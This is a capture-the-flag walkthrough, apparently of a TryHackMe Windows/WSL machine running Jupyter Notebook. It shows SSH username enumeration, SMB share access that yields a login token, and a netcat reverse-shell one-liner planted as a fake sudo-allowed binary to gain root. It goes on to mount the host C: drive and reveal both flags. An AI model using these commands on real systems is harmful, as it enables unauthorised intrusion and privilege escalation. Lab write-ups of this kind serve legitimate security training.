## Rustscan:

```Bash
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 2b17d88a1e8c99bc5bf53d0a5eff5e5e (RSA)
| ssh-rsa 
|   256 e9f030bee6cfeffe2d1421a0ac457b70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHw9uTZkIMEgcZPW9Z28Mm+FX66+hkxk+8rOu7oI6J9
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-22T12:58:30+00:00
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Issuer: commonName=DEV-DATASCI-JUP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-12T11:46:50
| Not valid after:  2023-09-11T11:46:50
| MD5:   1671b1902eb6b15f0c3fab16d3e66582
| SHA-1: c007197add30f17f2bdb65f81804fc6fd081c7c9
|_ssl-date: 2023-05-22T12:58:37+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8888/tcp  open  http          syn-ack ttl 127 Tornado httpd 6.0.3
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
|_http-server-header: TornadoServer/6.0.3
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
| http-methods:
|_  Supported Methods: GET POST
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
```

Ok seems like we have a Windows based OS here, I will add that FQDN found from RDP port and move forward with enumeration.

* * *

## SSH - Port 22:

So far as usual I don't think that bruteforce is the way to go here and I won't use it.

Checking on that particular version of Openssh for windows seems like are available some exploits that can help us enumerate the usernames: https://github.com/Sait-Nuri/CVE-2018-15473

We could clone that repository and run it thru to check what usernames are available:

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/CVE-2018-15473]
└─# python3 CVE-2018-15473.py 10.10.190.46 -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt
[-] root is an invalid username
[-] admin is an invalid username
[-] test is an invalid username
[-] guest is an invalid username
[-] info is an invalid username
[-] adm is an invalid username
[-] mysql is an invalid username
[-] user is an invalid username
[-] administrator is an invalid username
[-] oracle is an invalid username
[-] ftp is an invalid username
[-] pi is an invalid username
[-] puppet is an invalid username
[-] ansible is an invalid username
[-] ec2-user is an invalid username
[-] vagrant is an invalid username
[-] azureuser is an invalid username
No valid user detected.
```

Nothing interesting came out so I will try move forward for now.

* * *

## SAMBA/NETBIOS - Port 135,139,445:

When we need to enumerate Samba/Netbios the easiest is to use auto tools like Enum4Linux, CrackMapExec etc. And running the first one it appear that:

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# enum4linux-ng -A weasel.htb
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... weasel.htb
[*] Username ......... ''
[*] Random Username .. 'atzhlbmt'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on weasel.htb    |
 ===================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    NetBIOS Names and Workgroup/Domain for weasel.htb    |
 =========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =======================================
|    SMB Dialect Check on weasel.htb    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 =========================================================
|    Domain Information via SMB session for weasel.htb    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DEV-DATASCI-JUP
NetBIOS domain name: ''
DNS domain: DEV-DATASCI-JUP
FQDN: DEV-DATASCI-JUP
Derived membership: workgroup member
Derived domain: unknown

 =======================================
|    RPC Session Check on weasel.htb    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'atzhlbmt', password ''
[H] Rerunning enumeration with user 'atzhlbmt' might give more results

 =================================================
|    Domain Information via RPC for weasel.htb    |
 =================================================
[-] Could not get domain information via 'lsaquery': STATUS_ACCESS_DENIED

 =============================================
|    OS Information via RPC for weasel.htb    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

 ===================================
|    Users via RPC on weasel.htb    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ====================================
|    Groups via RPC on weasel.htb    |
 ====================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ====================================
|    Shares via RPC on weasel.htb    |
 ====================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =======================================
|    Policies via RPC for weasel.htb    |
 =======================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 =======================================
|    Printers via RPC for weasel.htb    |
 =======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 11.24 seconds

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─#
```

Ok seems like we got the OS version, the SMB version but nothing more, from RPC service nor from the SMB shares etc. I will do a manual enumeration with the old friend smbclient:

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# smbclient  -L //weasel.htb
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        datasci-team    Disk
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to weasel.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Ok we have a exctra smb share, but can we map it anonymously?

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# smbclient //weasel.htb/datasci-team
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 25 17:27:02 2022
  ..                                  D        0  Thu Aug 25 17:27:02 2022
  .ipynb_checkpoints                 DA        0  Thu Aug 25 17:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 17:26:46 2022
  misc                               DA        0  Thu Aug 25 17:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 17:26:46 2022
  papers                             DA        0  Thu Aug 25 17:26:47 2022
  pics                               DA        0  Thu Aug 25 17:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 17:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 17:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 17:26:46 2022

                15587583 blocks of size 4096. 8939291 blocks available
smb: \>
```

Yes sir! Let's see if we can get something juicy from it!

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# ll
total 1424
-rw-r--r-- 1 root root    940 May 10 11:58  cacert.der
drwxr-xr-x 3 root root   4096 May 22 15:10  CVE-2018-15473
-rw-r--r-- 1 root root 155198 Apr 11  2010  DevNullSmtp.jar
drwxr-xr-x 6 root root   4096 May 22 15:16  enum4linux-ng
-rw-r--r-- 1 root root     52 May 22 15:33  jupyter-token.txt
-rw-r--r-- 1 root root 830803 May 10 13:53  linpeas.sh
-rw-r--r-- 1 root root    146 May 22 15:32 'Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv'
-rw-r--r-- 1 root root 414804 May 22 15:32  MPE63-3_745-757.pdf
-rw-r--r-- 1 root root     12 May 22 15:33  requirements-checkpoint.txt
-rw-r--r-- 1 root root     12 May 22 15:32  requirements.txt
-rw-r--r-- 1 root root   5972 May 22 15:33  weasel-checkpoint.ipynb
-rw-r--r-- 1 root root   4308 May 22 15:32  weasel.ipynb
-rw-r--r-- 1 root root     51 May 22 15:32  weasel.txt
```

Ok except that jupyter token i don't anything here that is relevant to us, I will leave here and move forward with enumeration.

* * *

## RDP -  Port 389:

So far here the story is same as for SSH service, without a proper credentials set the RDP is useless in this stage cause we won't pursuite any bruteforce.

I will move forward with enumeration.

* * *

## WinRM - Port 5985:

Same story for WinRM service running on default port 5985, without a proper credentials set is useless. I will move forward.

* * *

## HTTP - Port 8888:

On first login via browser we are presented with a service called Jupiter:

![e1eedf131c5e68c8d6a0e0d1f26d40fd.png](../../../_resources/e1eedf131c5e68c8d6a0e0d1f26d40fd.png)

And at bottom we can reset password with use of a token and guess what?! i think we can use that token from Samba share to do so.

![4ae357b6f7204484dd37a46cbafbc64a.png](../../../_resources/4ae357b6f7204484dd37a46cbafbc64a.png)

Nice now we are in and we have a set of new credentials. Now checking from source code and Nmap we know this is a instance of Jupiter Notebook so I wonder if we can use this maybe? https://blog.jupyter.org/cve-2021-32797-and-cve-2021-32798-remote-code-execution-in-jupyterlab-and-jupyter-notebook-a70fae0d3239

But not knowing what is service version I wonder if we try to upload a php webshell and run it from there maybe? Spoiler: No, seems like we don't have any write/upload permission but then playing around with website I see this:

![9a4e0a5dd10f3aa05fc9fe71fdc50a45.png](../../../_resources/9a4e0a5dd10f3aa05fc9fe71fdc50a45.png)

That Terminal sems interesting, and clickin on it seems like we have our first pseudo shell?

## ![831206fb2f69a6527cc918e2778705a3.png](../../../_resources/831206fb2f69a6527cc918e2778705a3.png)

* * *

## Road to Local.txt:

Now I will try to enumerate the machine and PE to root, I guess we are in some kind of Docker environment since ssh is saying that is a Ubuntu machine but Nmap found Windows and several other ports define it like so.

Seems like default user is the only available except root and it have following sudo permissions:

```Bash
base) dev-datasci@DEV-DATASCI-JUP:/$ whoami
dev-datasci
(base) dev-datasci@DEV-DATASCI-JUP:/$ sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
(base) dev-datasci@DEV-DATASCI-JUP:/$
```

This definitely points my thought on docker environment:

```Bash
base) dev-datasci@DEV-DATASCI-JUP:/$ cat /etc/hosts
# This file is automatically generated by WSL based on the Windows hosts file:
# %WINDIR%\System32\drivers\etc\hosts. Modifications to this file will be overwritten.
127.0.0.1       localhost
127.0.1.1       DEV-DATASCI-JUP.localdomain     DEV-DATASCI-JUP

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
(base) dev-datasci@DEV-DATASCI-JUP:/$
```

Now I will try to upload a Linpeas and try to do a enumeration and see what other can I find interesting. But seems like it's not possible to download anything...

Edit: I think my WSL is broken again, I will try again at home...

Then At home I succeded to upload and run a Linpeas copy but performances were horrible:

```Bash
msf6 auxiliary(scanner/http/jupyter_login) > run

[*] 10.10.28.60:8888 - The server responded that it is running Jupyter version: 6.0.3
[!] No active DB -- Credential data will not be saved!
[+] 10.10.28.60:8888 - Login Successful: :067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Ok we have a Jupyter Notepad version 6.0.3

Here some stuff from Linpeas:

```Bash
╔══════════╣ Searching kerberos conf files and tickets
╚ http://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory
kadmin was found on /home/dev-datasci/anaconda3/bin/kadmin
kadmin was found on /home/dev-datasci/anaconda3/bin/kinit


╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
    
    ╔══════════╣ Protections
═╣ AppArmor enabled? .............. apparmor module is not loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (wsl)

╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.0  0.0   8324   152 ?        Ss   08:30   0:00 /init
root         3  0.0  0.0   8324   152 tty1     Ss   08:30   0:00 /init
root         4  0.0  0.1  18924  2708 tty1     S    08:30   0:00  _ sudo /bin/su dev-datasci -c /home/dev-datasci/anaconda3/bin/jupyter notebook --config=/home/dev-datasci/.jupyter/jupyter_notebook_config.py --no-browser --notebook-dir=/home/dev-datasci/datasci-team/ &
root         5  0.0  0.1  18032  2096 tty1     S    08:30   0:00      _ /bin/su dev-datasci -c /home/dev-datasci/anaconda3/bin/jupyter notebook --config=/home/dev-datasci/.jupyter/jupyter_notebook_config.py --no-browser --notebook-dir=/home/dev-datasci/datasci-team/ &
dev-dat+     6  0.0  2.5  75672 53416 ?        Ss   08:30   0:02          _ /home/dev-datasci/anaconda3/bin/python /home/dev-datasci/anaconda3/bin/jupyter-notebook --config=/home/dev-datasci/.jupyter/jupyter_notebook_config.py --no-browser --notebook-dir=/home/dev-datasci/datasci-team/

══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
DEV-DATASCI-JUP
127.0.0.1       localhost
127.0.1.1       DEV-DATASCI-JUP.localdomain     DEV-DATASCI-JUP

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal
localdomain


╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/home/dev-datasci
/mnt/c
/run/lock
```

Then I went back and I really think the root need to be got by that sudo -l but we need local user's credentials!

I started manually to enumerate for cache/config files for hardcoded credentials and maybe I found something:

```Bash
(base) dev-datasci@DEV-DATASCI-JUP:~/.jupyter$ ll
total 36
drwx------ 1 dev-datasci dev-datasci  4096 May 22 08:54 ./
drwxr-xr-x 1 dev-datasci dev-datasci  4096 May 22 09:07 ../
-rw------- 1 dev-datasci dev-datasci   103 May 22 09:38 jupyter_notebook_config.json
-rw-rw-rw- 1 dev-datasci dev-datasci 34453 Aug 25  2022 jupyter_notebook_config.py
-rw-rw-r-- 1 dev-datasci dev-datasci    26 Aug 25  2022 migrated
(base) dev-datasci@DEV-DATASCI-JUP:~/.jupyter$ cat jupyter_notebook_config.json
{
  "NotebookApp": {
    "password": "sha1:6593f2a13895:05091de708b55ae3b2bf32a8a9006c408667456e"
  }
}(base) dev-datasci@DEV-DATASCI-JUP:~/.jupyter$
```

If we try to crack that SHA1 hash? Spoiler: No, it's not working!

Then reading here seems like that should be the hashed password if token auth is not used and password instead, which is not our case here: https://jupyter-notebook.readthedocs.io/en/stable/security.html#security-in-the-jupyter-notebook-server

Then going back to sudo I forgot to check and apparently a binary is missing (/home/dev-datasci/.local/bin/jupyter) jupyter is missing under that path:

```Bash
(base) dev-datasci@DEV-DATASCI-JUP:~$ ll .local/bin/
total 0
drwxrwxrwx 1 dev-datasci dev-datasci 4096 Aug 25  2022 ./
drwx------ 1 dev-datasci dev-datasci 4096 Aug 25  2022 ../
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py*
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3*
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3.8*
(base) dev-datasci@DEV-DATASCI-JUP:~$
```

Which means we should be able to inject a fake jupyter and get a working root session..

```Bash
(base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ cat jupyter
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.79.35 5555 >/tmp/frm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i2>&1|nc 10.9.79.35 5555 >/tmp/f
```

And then running :

```Bash
base) dev-datasci@DEV-DATASCI-JUP:~/.local/bin$ sudo /home/dev-datasci/.local/bin/jupyter
```

This invoke a Revshell i our listening NC session as root!

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# nc -lvnp 5555  
listening on [any] 5555 ...

connect to [10.9.79.35] from (UNKNOWN) [10.10.236.131] 50343
# # id
uid=0(root) gid=0(root) groups=0(root)
#
```

But as far as I see user.txt is not in root in the container(btw is WSL):

```Bash
root@DEV-DATASCI-JUP:/# cd root
cd root
root@DEV-DATASCI-JUP:~# ls
ls
root@DEV-DATASCI-JUP:~# ll
ll
ctotal 4
drwx------ 1 root root 4096 Aug 25  2022 ./
drwxr-xr-x 1 root root 4096 Aug 25  2022 ../
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x 1 root root 4096 Aug 25  2022 .local/
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
```

We know from linpea scanning that C: disk was mapped under /mnt/c but is still void so I guess I have to find a way to map that c disk againg. Googling around I stumbled upon this: https://github.com/microsoft/WSL/issues/4122

Apparently we could check into /etc/wsl.conf for local settings:

root@DEV-DATASCI-JUP:/mnt/c# cat /etc/wsl.conf cat /etc/wsl.conf \[automount\] enabled = false 

root@DEV-DATASCI-JUP:/mnt/c# cat /etc/wsl.conf

cat /etc/wsl.conf

\[automount\]

enabled = false

```Bash
root@DEV-DATASCI-JUP:/mnt/c# cat /etc/wsl.conf
cat /etc/wsl.conf
[automount]
enabled = false
```

Ok this may be good!

After edit:

```Bash
root@DEV-DATASCI-JUP:/etc# cat ws	
cat wsl.conf 
[automount]
enabled = true
```

But we can't restart WSL so I googled a bit more and this made it working: ![89fcb741c78d92973026b639f9298471.png](../../../_resources/89fcb741c78d92973026b639f9298471.png)

```Bash
root@DEV-DATASCI-JUP:/mnt# mount | grep drvfs
mount | grep drvfs
root@DEV-DATASCI-JUP:/mnt# sudo mount -t drvfs C: /mnt/c
sudo mount -t drvfs C: /mnt/c
root@DEV-DATASCI-JUP:/mnt# ll
ll
total 0
drwxr-xr-x 1 root root 4096 Aug 25  2022 ./
drwxr-xr-x 1 root root 4096 Aug 25  2022 ../
drwxrwxrwx 1 root root 4096 Mar 14 04:14 c/
root@DEV-DATASCI-JUP:/mnt# cd c	^[[6~
cd c/~
bash: cd: c/~: No such file or directory
root@DEV-DATASCI-JUP:/mnt# cd c	
cd c/
root@DEV-DATASCI-JUP:/mnt/c# ls
ls
ls: cannot read symbolic link 'Documents and Settings': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'            'Program Files (x86)'         Users
'Documents and Settings'   ProgramData                  Windows
 PerfLogs                  Recovery                     datasci-team
'Program Files'           'System Volume Information'   pagefile.sys
root@DEV-DATASCI-JUP:/mnt/c#
```

Doing so we mounted back C disk on /mnt/c from the Host machine as root!

And grab our first flag:

```Bash
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv# cd Desktop
cd Desktop
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv/Desktop# ls
ls
desktop.ini  python-3.10.6-amd64.exe  user.txt
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv/Desktop# cat us	
cat user.txt 
THM{w3as3ls_@nd_pyth0ns} 
root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv/Desktop#
```

* * *

## Road to Root.txt:

Now I guess we have to find a way to login but the solutions was far easier, we could open Admininstrator from same terminal:

```bash
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator# cd Desktop
cd Desktop
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop# ls
ls
 ChromeSetup.exe                banner.txt                root.txt
 Ubuntu2004-220404.appxbundle   desktop.ini
'Visual Studio Code.lnk'        python-3.10.6-amd64.exe
root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop# cat root	
cat root.txt 
THM{evelated_w3as3l_l0ngest_boi}root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop#
```

And so we solved the machine!

* * *